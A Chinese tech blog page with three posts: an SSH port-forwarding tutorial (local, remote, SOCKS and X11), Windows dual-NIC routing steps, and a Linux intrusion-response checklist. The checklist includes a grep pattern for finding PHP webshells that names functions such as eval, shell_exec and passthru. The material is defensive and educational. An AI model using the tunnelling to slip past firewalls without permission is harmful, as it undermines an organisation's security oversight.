<h5 id="图-1-SSH-端口转发"><a href="#图-1-SSH-端口转发" class="headerlink" title="图 1. SSH 端口转发"></a>图 1. SSH 端口转发</h5><p><img src="/images/2017-12-07/image001.jpg" alt=""></p>
<p>如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。</p>
<h2 id="第二部分-本地转发与远程转发"><a href="#第二部分-本地转发与远程转发" class="headerlink" title="第二部分 本地转发与远程转发"></a>第二部分 本地转发与远程转发</h2><h3 id="本地转发实例分析"><a href="#本地转发实例分析" class="headerlink" title="本地转发实例分析"></a>本地转发实例分析</h3><p>我们先来看第一个例子，在实验室里有一台 LDAP 服务器（LdapServerHost），但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器（LdapClientHost）直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？</p>
<p>答案无疑是本地端口转发了，它的命令格式是：</p>
<p><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
<p>在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如：</p>
<p><code>$ ssh -L 7001:localhost:389 LdapServerHost</code></p>
<h5 id="图-2-本地端口转发"><a href="#图-2-本地端口转发" class="headerlink" title="图 2. 本地端口转发"></a>图 2. 本地端口转发</h5><p><img src="/images/2017-12-07/image002.jpg" alt=""></p>
<p>这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。</p>
<p>然后我们可以将远程机器（LdapClientHost）上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子：</p>
<ul>
<li>我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，</li>
<li>而本机的 SSH Client 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Server 上。</li>
<li>SSH Server 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，</li>
<li>最后再将从 LDAP 返回的数据原路返回以完成整个流程。</li>
</ul>
<p>我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。</p>
<p>这里有几个地方需要注意：</p>
<ol>
<li>SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。一旦关闭了此连接，相应的端口转发也会随之关闭。</li>
<li>我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。</li>
<li>你可能会疑惑上面命令中的 \<remote host\=""> 为什么用 localhost，它指向的是哪台机器呢？在本例中，它指向 LdapServertHost 。我们为什么用 localhost 而不是 IP 地址或者主机名呢？其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 lookback 接口访问的话，那么自然就只有 localhost 或者 IP 为 127.0.0.1 才能访问了，而不能用真实 IP 或者主机名。</remote></li>
<li>命令中的\<remote host\=""> 和 \<ssh hostname\=""> 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。我们在后面的例子里会详细阐述这点。</ssh></remote></li>
<li>好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 lookback 接口，这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“ connection refused. ”。好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。<br><code>ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></li>
</ol>
<h3 id="远程转发实例分析"><a href="#远程转发实例分析" class="headerlink" title="远程转发实例分析"></a>远程转发实例分析</h3><p>我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器（LdapServertHost），但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。</p>
<p>它的命令格式是：</p>
<p><code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
<p>例如在 LDAP 服务器（LdapServertHost）端执行如下命令：</p>
<p><code>$ ssh -R 7001:localhost:389 LdapClientHost</code></p>
<h5 id="图-3-远程端口转发"><a href="#图-3-远程端口转发" class="headerlink" title="图 3. 远程端口转发"></a>图 3. 远程端口转发</h5><p><img src="/images/2017-12-07/image003.jpg" alt=""></p>
<p>和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。</p>
<p>看到这里，你是不是会有点糊涂了么？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？</p>
<h3 id="本地转发与远程转发的对比与分析"><a href="#本地转发与远程转发的对比与分析" class="headerlink" title="本地转发与远程转发的对比与分析"></a>本地转发与远程转发的对比与分析</h3><p>不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。</p>
<p>我们可以回忆上面的两个例子来做个对照。</p>
<p>本地转发时：</p>
<p>LdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。</p>
<p>远程转发时：</p>
<p>LdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。</p>
<p>另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。</p>
<p>弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost 。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。</p>
<p>接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 \<remote host\=""> 和 \<ssh hostname\=""> 可以是不同的机器么？</ssh></remote></p>
<p><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
<p>答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。</p>
<h5 id="图-4-多主机转发应用"><a href="#图-4-多主机转发应用" class="headerlink" title="图 4. 多主机转发应用"></a>图 4. 多主机转发应用</h5><p><img src="/images/2017-12-07/image004.jpg" alt=""></p>
<p>在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发：</p>
<p><code>$ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt;</code></p>
<p>然后在我们的应用客户端（A）上配置连接机器（C ）的 7001 端口即可。注意我们在命令中指定了“ -g ”参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）<-> (C) 以及 (B)<->(D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。</-></-></p>
<h2 id="第三部分-其他类型的转发"><a href="#第三部分-其他类型的转发" class="headerlink" title="第三部分 其他类型的转发"></a>第三部分 其他类型的转发</h2><h3 id="动态转发实例分析"><a href="#动态转发实例分析" class="headerlink" title="动态转发实例分析"></a>动态转发实例分析</h3><p>恩，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。</p>
<p>当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式：</p>
<p><code>$ ssh -D &lt;local port&gt; &lt;SSH Server&gt;</code></p>
<p>例如：</p>
<p><code>$ ssh -D 7001 &lt;SSH Server&gt;</code></p>
<h5 id="图-5-动态端口转发"><a href="#图-5-动态端口转发" class="headerlink" title="图 5. 动态端口转发"></a>图 5. 动态端口转发</h5><p><img src="/images/2017-12-07/image005.jpg" alt=""></p>
<p>似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述：</p>
<p><code>-D port `</code> <code>This works by allocating a socket to listen to port on the local</code> <code>side, and whenever a connection is made to this port, the con-</code> <code>nection is forwarded over the secure channel, and the applica-</code> <code>tion protocol is then used to determine where to connect to from</code> <code>the remote machine.  Currently the SOCKS4 and SOCKS5 protocols</code> <code>are supported, and ssh will act as a SOCKS server.  Only root</code> <code>can forward privileged ports.  Dynamic port forwardings can also</code> <code></code>be specified in the configuration file.`</p>
<p>之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。</p>
<h3 id="X-协议转发实例分析"><a href="#X-协议转发实例分析" class="headerlink" title="X 协议转发实例分析"></a>X 协议转发实例分析</h3><p>好了，让我们来看最后一个例子 - X 协议转发。</p>
<p>我们日常工作当中，可能会经常会远程登录到 Linux/Unix/Solaris/HP 等机器上去做一些开发或者维护，也经常需要以 GUI 方式运行一些程序，比如要求图形化界面来安装 DB2/WebSphere 等等。这时候通常有两种选择来实现：VNC 或者 X 窗口，让我们来看看后者。</p>
<p>使用 X 窗口通常需要分别安装：X Client 和 X Server 。在本例中我们的 X Client 就是所访问的远程 Linux/Unix/Solaris/HP，而我们的 X Server 则是发起访问的本地机器（例如你面前正在使用的笔记本或台式机）。把 X Client 端的 X 窗口显示在 X Server 端需要先行在 X Client 端指定 X Server 的位置，命令格式如下：</p>
<p><code>export DISPLAY=&lt;X Server IP&gt;:&lt;display #&gt;.&lt;virtual #&gt;</code></p>
<p>例如：</p>
<p><code>export DISPLAY=myDesktop:1.0</code></p>
<p>然后直接运行 X 应用即可，X 窗口就会自动在我们的本地端打开。</p>
<p>一切运行正常，但是，这时候 IT 部门突然在远程 Linux/Unix/Solaris/HP 前面加了一道防火墙。非常不幸的是，X 协议并不在允许通过的列表之内。怎么办？只能使用 VNC 了么？不，其实只要使用了 SSH 端口转发即可通过，同时也对 X 通讯数据做了加密，真是一举两得。（当然，使用此方法前最好先咨询相关 IT 部门是否符合相应的安全条例，以免造成违规操作。）</p>
<p>建立命令也很简单，直接从本地机器（X Server 端）发起一个如下的 SSH 连接即可：</p>
<p><code>$ ssh -X &lt;SSH Server&gt;</code></p>
<h5 id="图-6-X-转发"><a href="#图-6-X-转发" class="headerlink" title="图 6. X 转发"></a>图 6. X 转发</h5><p><img src="/images/2017-12-07/image006.jpg" alt=""></p>
<p>建立连接之后就可以直接运行远程的 X 应用。注意建立 X 转发之后会自动设置 DISPLAY 环境变量，通常会被设置成<code>localhost:10.0</code>，我们无需也不应该在连接之后再进行修改此环境变量。</p>
<p>一个比较常见的场景是，我们的本地机器是 Windows 操作系统，这时可以选择开源的 XMing 来作为我们的 XServer，而 SSH Client 则可以任意选择了，例如 PuTTY，Cygwin 均可以配置 访问 SSH 的同时建立 X 转发。</p>
<h2 id="第四部分-总结"><a href="#第四部分-总结" class="headerlink" title="第四部分 总结"></a>第四部分 总结</h2><p>至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/06/windows使用双网卡/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/06/windows使用双网卡/" itemprop="url">windows使用双网卡</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-06T23:08:52+08:00">
                2017-12-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tool/" itemprop="url" rel="index">
                    <span itemprop="name">tool</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>外网地址设置</strong></p>
<p>本地IP地址：192.168.1.1<br>子网掩码： 255.255.255.0，<br>网关： 192.168.1.1</p>
<p><strong>内网地址设置：</strong></p>
<p>本地IP地址：  192.168.42.129<br>子网掩码：255.255.255.0<br>网关：192.168.42.132</p>
<p>按正常的设置每块网卡的ip（或通过DHCP自动获取），再cmd下使用route print查看时会看到。即指向0.0.0.0的有两个网关，这样就会出现路由冲突，两个网络的访问都会出现问题。我们需要手动配置路由，才能实现同时访问两个网络。运行cmd（win7/8需要管理员权限）。</p>
<p><strong>第一步：</strong> route delete 0.0.0.0   ::删除所有的0.0.0.0的路由</p>
<p><strong>第二步：</strong>route -p add 0.0.0.0 mask 0.0.0.0 mask 192.168.1.1  ::添加0.0.0.0网络路由，这个是缺省时路由用192.168.1.1,加上-p的目的是设为静态（永久）路由，防止下次重起时配置消失。</p>
<p><strong>第三步：</strong> route -p add 192.168.42.0 mask 255.255.255.0 192.168.42.132  ::添加192.168.42.0网段路由为192.168.42.132内网路由，可以根据需要调整ip段和子网掩码太到多网段内网路由的效果。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/05/安全应急排查手册/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/05/安全应急排查手册/" itemprop="url">安全应急排查手册</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-05T17:37:58+08:00">
                2017-12-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="1-事件分类"><a href="#1-事件分类" class="headerlink" title="1 事件分类"></a>1 事件分类</h2><p>常见的安全事件：</p>
<p>Web入侵：挂马、篡改、Webshell</p>
<p>系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞</p>
<p>病毒木马：远控、后门、勒索软件</p>
<p>信息泄漏：拖裤、数据库登录（弱口令）</p>
<p>网络流量：频繁发包、批量请求、DDOS攻击</p>
<h2 id="2-排查思路"><a href="#2-排查思路" class="headerlink" title="2 排查思路"></a>2 排查思路</h2><p>一个常规的入侵事件后的系统排查思路：</p>
<p><img src="/images/2017-12-05/59376b994b3f9.jfif" alt=""></p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><blockquote>
<p>a) 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</p>
<p>b) Webshell 排查与分析</p>
<p>c) 核心应用关联目录文件分析</p>
</blockquote>
<h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><blockquote>
<p>a) 当前活动进程 &amp; 远程连接</p>
<p>b) 启动进程&amp;计划任务</p>
<p>c) 进程工具分析</p>
<p>​      i. Windows:Pchunter</p>
<p>​      ii. Linux: Chkrootkit&amp;Rkhunter</p>
</blockquote>
<h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><blockquote>
<p>a) 环境变量</p>
<p>b) 帐号信息</p>
<p>c) History</p>
<p>d) 系统配置文件</p>
</blockquote>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><blockquote>
<p>a) 操作系统日志</p>
<p>​      i. Windows: 事件查看器（eventvwr）</p>
<p>​      ii. Linux: /var/log/</p>
<p>b) 应用日志分析</p>
<p>​      i. Access.log</p>
<p>​      ii. Error.log</p>
</blockquote>
<h3 id="3-分析排查"><a href="#3-分析排查" class="headerlink" title="3 分析排查"></a>3 分析排查</h3><h4 id="3-1-Linux系列分析排查"><a href="#3-1-Linux系列分析排查" class="headerlink" title="3.1 Linux系列分析排查"></a>3.1 Linux系列分析排查</h4><h5 id="3-1-1-文件分析"><a href="#3-1-1-文件分析" class="headerlink" title="3.1.1 文件分析"></a>3.1.1 文件分析</h5><p>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</p>
<p>  例如:</p>
<p>  查看tmp目录下的文件： ls –alt /tmp/</p>
<p>  查看开机启动项内容：ls -alt /etc/init.d/</p>
<p>  查看指定目录下文件时间的排序：ls  -alt  | head -n 10</p>
<p>  针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有   线性关联，说明可能被篡改或者其他。</p>
<p><img src="/images/2017-12-05/59376b9c7bbd0.jfif" alt=""></p>
<p>新增文件分析</p>
<p>  例如要查找24小时内被修改的JSP文件： find ./ -mtime 0 -name &quot;*.jsp&quot;</p>
<p>  （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）</p>
<p>  查找72小时内新增的文件find / -ctime -2</p>
<p>  PS：-ctime 内容未改变权限改变时候也可以查出</p>
<p> 根据确定时间去反推变更的文件</p>
<p>  ls -al /tmp | grep &quot;Feb 27&quot;</p>
<p>特殊权限的文件</p>
<p>  查找777的权限的文件   find  /  *.jsp  -perm 4777  </p>
<p>隐藏的文件（以 &quot;.&quot;开头的具有隐藏属性的文件）</p>
<p>在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。</p>
<h5 id="3-1-2-进程命令"><a href="#3-1-2-进程命令" class="headerlink" title="3.1.2 进程命令"></a>3.1.2 进程命令</h5><p>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p>
<p>   netstat –antlp | more</p>
<p><img src="/images/2017-12-05/59376ba136b5f.jfif" alt=""></p>
<p>使用ps命令，分析进程</p>
<p>ps aux | grep pid | grep –v grep </p>
<p><img src="/images/2017-12-05/59376ba5c8763.jfif" alt=""></p>
<p>将netstat与ps 结合，可参考vinc牛的案例：</p>
<p><img src="/images/2017-12-05/59376ba9a532c.jfif" alt=""></p>
<p>（可以使用lsof -i:1677 查看指定端口对应的程序）</p>
<p>使用ls 以及 stat 查看系统命令是否被替换。</p>
<p>两种思路：第一种查看命令目录最近的时间排序，第二种根据确定时间去匹配。</p>
<p>  ls -alt /usr/bin   | head -10</p>
<p>  ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</p>
<p><img src="/images/2017-12-05/59376f9f9746d.jfif" alt=""></p>
<p>PS：如果日期数字&lt;10，中间需要两个空格。比如1月1日，grep “Jan  1”</p>
<p>隐藏进程查看</p>
<p>ps -ef | awk &#39;{print}&#39; | sort -n | uniq &gt;1<br>ls /proc | sort -n |uniq &gt;2<br>diff 1 2</p>
<h5 id="3-1-3-系统信息"><a href="#3-1-3-系统信息" class="headerlink" title="3.1.3 系统信息"></a>3.1.3 系统信息</h5><p>history (cat /root/.bash_history)<br>/etc/passwd<br>crontab  /etc/cron*<br>rc.local  /etc/init.d chkconfig<br>last<br>$PATH<br>strings</p>
<p>查看分析history (cat /root/.bash_history)，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息：</p>
<p>   a) wget 远程某主机（域名&amp;IP）的远控文件；</p>
<p>   b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图;</p>
<p>   c) 打包某敏感数据或代码，tar zip 类命令</p>
<p>   d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p>
<p>查看分析用户相关分析</p>
<p>  a) useradd userdel 的命令时间变化（stat），以及是否包含可疑信息</p>
<p>  b) cat /etc/passwd 分析可疑帐号，可登录帐号</p>
<p>  查看UID为0的帐号：awk -F: &#39;{if($3==0)print $1}&#39; /etc/passwd</p>
<p>  查看能够登录的帐号：cat /etc/passwd  | grep -E &quot;/bin/bash$&quot;</p>
<p>  PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</p>
<p><img src="/images/2017-12-05/59376fa56d8e4.jfif" alt=""></p>
<p>查看分析任务计划</p>
<p>   a) 通过crontabl –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</p>
<p>   b) 查看etc目录任务计划相关文件，ls /etc/cron*</p>
<p>查看linux 开机启动程序</p>
<p>   a) 查看rc.local文件（/etc/init.d/rc.local     /etc/rc.local）</p>
<p>   b) ls –alt /etc/init.d/</p>
<p>   c) chkconfig</p>
<p>查看系统用户登录信息</p>
<p>   a) 使用lastlog命令，系统中所有用户最近一次登录信息。</p>
<p>   b) 使用lastb命令，用于显示用户错误的登录列表</p>
<p>   c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp）</p>
<p>​       utmp文件中保存的是当前正在本系统中的用户的信息。</p>
<p>​       wtmp文件中保存的是登录过本系统的用户的信息。</p>
<p>​       /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp</p>
<p><img src="/images/2017-12-05/59376faa2f97f.jfif" alt="干货 | 黑客入侵？这里有详细的应急排查手册！"></p>
<p>系统路径分析</p>
<p>   a) echo $PATH 分析有无敏感可疑信息</p>
<p>指定信息检索</p>
<p>   a) strings命令在对象文件或二进制文件中查找可打印的字符串</p>
<p>   b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep &#39;[1-9]{1,3}.[1-9]{1,3}.&#39;</p>
<p>   PS：此正则不严谨，但匹配IP已够用</p>
<p>   c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）</p>
<p>查看ssh相关目录有无可疑的公钥存在。</p>
<p>   a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。</p>
<p>   b) 目录： /etc/ssh    ./.ssh/</p>
<h5 id="3-1-4-后门排查"><a href="#3-1-4-后门排查" class="headerlink" title="3.1.4 后门排查"></a>3.1.4 后门排查</h5><p>除以上文件、进程、系统 分析外，推荐工具：</p>
<p>​    chkrootkit  rkhunter（<a href="http://www.chkrootkit.org" target="_blank" rel="external">www.chkrootkit.org</a>   rkhunter.sourceforge.net）</p>
<p>Ø chkrootkit</p>
<blockquote>
<p>(迭代更新了20年)主要功能：</p>
<p>检测是否被植入后门、木马、rootkit</p>
<p>检测系统命令是否正常</p>
<p>检测登录日志</p>
<p>详细参考README</p>
</blockquote>
<p><img src="/images/2017-12-05/59376fb0379ff.jfif" alt=""></p>
<p>Ø rkhunter主要功能：</p>
<blockquote>
<p>系统命令（Binary）检测，包括Md5 校验</p>
<p>Rootkit检测</p>
<p>本机敏感目录、系统配置、服务及套间异常检测</p>
<p>三方应用版本检测</p>
</blockquote>
<p><img src="/images/2017-12-05/59376fbbc7f15.jfif" alt=""></p>
<p>Ø RPM check检查</p>
<p>系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查</p>
<p>./rpm -Va &gt; rpm.log</p>
<p>如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串,  c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。 . (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：</p>
<p>5 MD5 校验码<br>S 文件尺寸<br>L 符号连接<br>T 文件修改日期<br>D 设备<br>U 用户<br>G 用户组<br>M 模式e (包括权限和文件类型)</p>
<p>借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了</p>
<p><img src="/images/2017-12-05/59377238ecb67.jfif" alt=""></p>
<p>Ø Webshell查找</p>
<p>​    Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。</p>
<p>可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报)</p>
<p>find /var/www/ -name &quot;<em>.php&quot; |xargs egrep &#39;assert|phpspy|c99sh|milw0rm|eval|(gunerpress|(base64_decoolcode|spider_bc|shell_exec|passthru|(\$\_\POST[|eval (str_rot13|.chr(|\${\&quot;\_P|eval(\$\_R|file_put_contents(.\</em>\$\_|base64_decode&#39;</p>
<p>Webshell的排查可以通过</p>
<p>Github上存在各种版本的webshell查杀脚本，当然都有自己的特点，可使用河马shell查杀（shellpub.com）</p>
<p>综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施：</p>
<p>根据进程、连接等信息关联的程序，查看木马活动信息。</p>
<p>假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p>
<p>发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p>
<p>发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p>
<p>3.1.5 日志分析</p>
<p>​    日志文件 /var/log/message       包括整体系统信息 /var/log/auth.log        包含系统授权信息，包括用户登录和使用的权限机制等 /var/log/userlog         记录所有等级用户信息的日志。 /var/log/cron           记录crontab命令是否被正确的执行 /var/log/xferlog(vsftpd.log)记录Linux FTP日志 /var/log/lastlog         记录登录的用户，可以使用命令lastlog查看 /var/log/secure         记录大多数应用输入的账号与密码，登录成功与否 var/log/wtmp　　      记录登录系统成功的账户信息，等同于命令last var/log/faillog　　      记录登录系统不成功的账号信息，一般会被黑客删除   </p>
<p>1.日志查看分析，grep,sed,sort,awk综合运用</p>
<p>2.基于时间的日志管理：</p>
<p>   /var/log/wtmp</p>
<p>   /var/run/utmp</p>
<p>   /var/log/lastlog(lastlog)</p>
